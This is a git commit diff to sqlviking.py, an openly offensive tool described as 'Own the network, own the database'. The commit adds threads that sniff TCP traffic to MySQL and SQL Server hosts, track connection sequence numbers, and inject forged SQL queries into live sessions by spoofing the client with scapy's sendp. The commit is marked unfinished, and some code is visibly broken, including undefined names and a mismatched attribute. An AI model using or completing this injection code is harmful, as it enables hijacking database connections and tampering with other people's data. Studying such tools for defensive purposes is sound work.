23298b1b5b22779c0b7aaa38f5c45cb8eda65650
Atticuss <Atticuss@github.com>
2015-05-04 08:58:22 -0400

    unfinished commit, switching dev machines

--- sqlviking.py
+++ sqlviking.py
@@ -6,8 +6,10 @@ sys.path.append("databases/")
 from constantvalues import *
 import mysql,sqlserver
 
-dbQueue = Queue()
+dbQueue1 = Queue()
+dbQueue2 = Queue()
 injectionQueue = Queue()
+pktQueue = Queue()
 
 debug = True
 
@@ -62,22 +64,151 @@ class Table():
     def __init__(self,name,db):
         return
 
-class Scout(threading.Thread):
+class Scout(thread.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.knownDatabases = []
+        self.die = False
+
+    def run(self):
+        while not self.die:
+            while not dbQueue2.empty():
+                self.knownDatabases.append(dbQueue2.get())
+            try:
+                sniff(prn=lambda x: self.putPkt,filter="tcp",store=0,timeout=5)
+            except:
+                print sys.exc_info()[1]
+                self.die = True
+
+    def putPkt(self,pkt):
+        for db in self.knownDatabases:
+            if (pkt[Ether].src == db.ip and pkt[TCP].sport == db.sport) or (pkt[Ether].dst == db.ip and pkt[TCP].dport == db.port):
+                pktQueue.put(pkt)
+
+class Parse(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
         self.die = False
         self.toInject = []
         self.knownDatabases = []
+        self.knownConns = []
 
     def run(self):
-        global dbs
         while not self.die:
-            if not dbQueue.empty():
-                self.knownDatabases.append(dbQueue.get())
-                #dprint('[?] DB found: %s at %s:%s'%(self.knownDatabases[-1].getHumanType(),self.knownDatabases[-1].ip,self.knownDatabases[-1].port))
-            if not injectionQueue.empty():
+            while not dbQueue1.empty():
+                self.knownDatabases.append(dbQueue1.get())
+            while not injectionQueue.empty():
                 self.toInject.append(injectionQueue.get())
-                #dprint('[?] Injection parsed - %s'%self.toInject[-1])
+            if not pktQueue.empty():
+                self.handle(pktQueue.get())
+
+    def getConn(self,pkt):
+        for p in self.knownConns:
+            if p.cip == pkt[Ether].src and p.sip == pkt[Ether].dst and p.sport == pkt[TCP].sport and p.cport == pkt[TCP].dport:
+                return p #is req
+            elif p.cip == pkt[Ether].dst and p.sip == pkt[Ether].src and p.sport == pkt[TCP].dport and p.cport == pkt[TCP].sport:
+                return p #is resp
+
+    def handle(self,pkt):
+        #even with TCP filter set on scapy, will occassionally get packets
+        #with no TCP layer. throws exception and breaks thread.
+        pkts = []
+        try:
+            pkt[TCP]
+        except:
+            return
+
+        c  = self.getConn(pkt)
+
+        #check if injection should be performed
+        if c:
+            for i in self.inject:
+                self.printLn("[1] %s %s %s %s %s %s"%(c.db.ip,i[1],c.db.port,i[2],pkt[TCP].sport,pkt[TCP].flags))
+                if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2] and pkt[TCP].flags == 24: #make sure injecting after db response and it isn't a fragged response
+                    self.printLn("[2] attempting injection")
+                    #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
+                    #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
+                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/databaseList[c.db.dbType].encodeQuery(i[0]))
+                    self.inject.remove(i)
+
+        #check if pkt is with knowndb, only need in fingerprint mode
+        #db = self.isKnownDB(pkt)
+        
+        #if c and c.db == UNKNOWN:
+        #    c.db = db
+
+        #check for control packets
+        if c and pkt[TCP].flags == 17: #FIN/ACK pkt
+            self.delConn(c)
+            return
+        elif pkt[TCP].flags == 2 and not c: #SYN pkt
+            #more fingerpringing logic
+            #if db
+            #    c = self.addConn(pkt,db,state=HANDSHAKE)
+            #else:
+            c = self.addConn(pkt)
+            c.nextcseq = pkt[TCP].seq+1
+            return
+        
+        #empty pkt, no reason to parse. scapy sometimes returns empty pkts with [tcp].payload of several '0' values
+        if len(pkt[TCP].payload) == 0 or (len(pkt[TCP].payload) <= 16 and str(pkt[TCP].payload).encode('hex') == '00'*len(pkt[TCP].payload)): 
+            return
+
+        #more fingerprint stuff
+        #if not c: #check if conn is being made to a known DB
+            #db = self.isKnownDB(pkt)
+        #    if db:
+                #self.printLn("[*] connecting to known db")
+        #        c = self.addConn(pkt,db)
+            #else:
+                #self.printLn("[*] connecting to unknown server")
+
+        ip, port, dbType = None, None, None
+
+        #if not c or c.db == UNKNOWN:
+        if not c:
+            #pktType = self.fingerprint(str(pkt[TCP].payload))
+            if ISRESP(pktType):
+                ip = pkt[IP].src
+                port = pkt[TCP].sport
+            elif ISREQ(pktType):
+                ip = pkt[IP].dst
+                port = pkt[TCP].dport
+
+            if ISMYSQL(pktType):
+                dbType = MYSQL
+            elif ISSQLSERV(pktType):
+                dbType = SQLSERV
+
+            if ip and port and dbType:
+                db = DataBase(ip=ip,port=port,dbType=dbType)
+                self.knownDBs.append(db)
+                if not c:
+                    c = self.addConn(pkt,db)
+                else:
+                    c.db = db
+        
+        if c:
+            if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport and c.nextcseq != -1 and c.nextcseq != pkt[TCP].seq: #is a bad req
+                return
+            elif pkt[IP].dst == c.cip and pkt[TCP].dport == c.cport and c.nextsseq != -1 and c.nextsseq != pkt[TCP].seq: #is a bad resp
+                return
+
+            if (pkt[TCP].flags >> 3) % 2 == 0: #PSH flag not set, is a fragged pkt. this breaks on data sent over lo interface. scapy does not seem to handle len(pkt)>MTU well. 
+                c.frag.append(pkt)
+            else:
+                if len(c.frag) > 0:
+                    for p in c.frag:
+                        pkts.append(p)
+                    c.frag = []
+                pkts.append(pkt)
+                if c.db != UNKNOWN:
+                    self.parse(pkts,c)
+
+            if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport:
+                c.nextcseq = len(pkt[TCP].payload)+pkt[TCP].seq
+            else:
+                c.nextsseq = len(pkt[TCP].payload)+pkt[TCP].seq
 
 def dprint(s):
     global debug
@@ -108,7 +239,8 @@ def parseConfig(f):
             elif flag == DATABASES:
                 l = l.split(':')
                 #dprint('[?] Parsing line for db info:\t%s'%l)
-                dbQueue.put(Database(l[0],l[1],l[2]))
+                dbQueue1.put(Database(l[0],l[1],l[2]))
+                dbQueue2.put(Database(l[0],l[1],l[2]))
             elif flag == INJECTION:
                 injectionQueue.put(l)
             elif flag == DATA:
@@ -117,7 +249,7 @@ def parseConfig(f):
                 l = l #do nothing for know, leave check so i remember to update later when stuff is actually implemented
 
 def main():
-    parser = argparse.ArgumentParser(description='Pwn the network, pwn the database', prog='sqlviking.py', usage='%(prog)s [-v] -c <config file location>', formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=65, width =150))
+    parser = argparse.ArgumentParser(description='Own the network, own the database', prog='sqlviking.py', usage='%(prog)s [-v] -c <config file location>', formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=65, width =150))
     parser.add_argument('-v', '--verbose', action='store_true', help='Turn on verbose mode; will print out all captured traffic')
     parser.add_argument('-c', '--configfile', default='sqlviking.conf', help='Config file location, defaults to sqlviking.conf')
     args = parser.parse_args()
